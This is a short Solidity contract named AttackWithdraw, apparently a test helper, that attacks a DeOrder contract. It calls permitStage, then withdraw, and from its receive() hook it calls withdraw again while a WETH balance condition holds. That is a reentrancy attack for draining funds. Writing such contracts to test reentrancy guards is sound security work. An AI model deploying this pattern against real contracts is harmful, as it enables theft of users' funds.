import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";
import "contracts/interface/IOrder.sol";

contract AttackWithdraw {
    DeOrder public deOrder;
    WETH public weth;

    constructor(
        DeOrder _deOrder,
        WETH _weth
    ) {
        deOrder = _deOrder;
        weth = _weth;
    }

    function start(
        uint256[] memory _amounts,
        uint256[] memory _periods,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        deOrder.permitStage(
            2,
            _amounts,
            _periods,
            PaymentType.Due,
            0,
            20000,
            v,
            r,
            s
        );
    }

    // receive() external payable {}
    receive() external payable {
        if (weth.totalSupply() >= 1 ether) {
            deOrder.withdraw(2, address(this));
        }
    }

    function attack() external payable {
        deOrder.withdraw(2, address(this));
    }
}
